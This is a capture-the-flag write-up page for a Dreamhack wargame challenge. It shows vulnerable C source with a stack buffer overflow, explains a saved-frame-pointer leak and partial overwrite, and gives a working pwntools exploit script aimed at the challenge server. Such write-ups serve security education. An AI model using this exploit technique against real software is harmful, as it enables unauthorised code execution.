@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be seen <a href="https://dreamhack.io/wargame/challenges/715">here</a>.</p>
+        <p>The source code of the target program is as below</p>
+        <pre><code>
+/* msnw.c
+ * gcc -no-pie -fno-stack-protector -mpreferred-stack-boundary=8 msnw.c -o msnw
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define MEONG 0
+#define NYANG 1
+
+#define NOT_QUIT 1
+#define QUIT 0
+
+void Init() {
+    setvbuf(stdin, 0, _IONBF, 0);
+    setvbuf(stdout, 0, _IONBF, 0);
+    setvbuf(stderr, 0, _IONBF, 0);
+}
+
+int Meong() {
+    char buf[0x40];
+
+    memset(buf, 0x00, 0x130);
+
+    printf("meong 🐶: ");
+    read(0, buf, 0x132);
+
+    if (buf[0] == 'q')
+        return QUIT;
+    return NOT_QUIT;
+}
+
+int Nyang() {
+    char buf[0x40];
+
+    printf("nyang 🐱: ");
+    printf("%s", buf);
+
+    return NOT_QUIT;
+}
+
+int Call(int animal) {
+    return animal == MEONG ? Meong() : Nyang();
+}
+
+void Echo() {
+    while (Call(MEONG)) Call(NYANG);
+}
+
+void Win() {
+    execl("/bin/cat", "/bin/cat", "./flag", NULL);
+}
+
+int main(void) {
+    Init();
+
+    Echo();
+    puts("nyang 🐱: goodbye!");
+
+    return 0;
+}
+
+        </code></pre>
+
+        <p>Since <code>Meong</code> allows you to overwrite the lower 2 bytes of the SFP, we can think of SFP overwrite attack. 
+           Analyzing via gdb we can observe that the SFP of Meong and Nyang are the same, due to the fact that they are both
+           called from <code>Call</code>. Which means that if we somehow leak the SFP of either functions we can get the SFP of the other one.<br>
+           So the exploit will be done in twofolds: first using <code>Nyang</code> to leak the SFP, and then using <code>Meong</code> to overwrite
+           the SFP to the address of <code>buf</code>.<br/> We fill up the buffer with <code>'A'</code> in <code>Meong</code> 
+           so that when <code>Nyang</code> is called the SFP will be printed out by <code>printf("%s)</code>.
+           Examining gdb again we can observe that the address of <code>buf</code> is always <code>0x330</code> less than the value of the leaked SFP.
+           So after leaking the SFP, when overwriting the last two bytes of the SFP in <code>Meong</code>, we fill up buf with the address of 
+           <code>Win</code> except for  the last 2 bytes, which will be the last two bytes of the calculated address of <code>buf</code>. 
+           <br>The exploit code is as below. 
+        </p>
+
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def ex():
+    #context.log_level = "debug"
+    win_addr=  0x40135b
+    #p = process("./msnw")
+    p = remote("host8.dreamhack.games", 10701)
+
+    p.sendafter(b": ", b"A"*0x130)
+    x = u64(p.recvuntil(b"\x7f").split(b": ")[1][-6:] + b"\x00\x00")
+    buf_addr = x - 0x330
+    print("sfp: %x, buf_addr: %x" %  (x, buf_addr))
+
+    payload = p64(win_addr)
+    while len(payload) &lt; 0x130:
+        payload += p64(win_addr)
+    payload += p64(buf_addr)[0:2]
+    p.sendafter(b": ", payload)
+    p.interactive()
+
+if __name__ == "__main__": ex()
+
+        </code></pre>
+    </main>
+</body>
+</html>
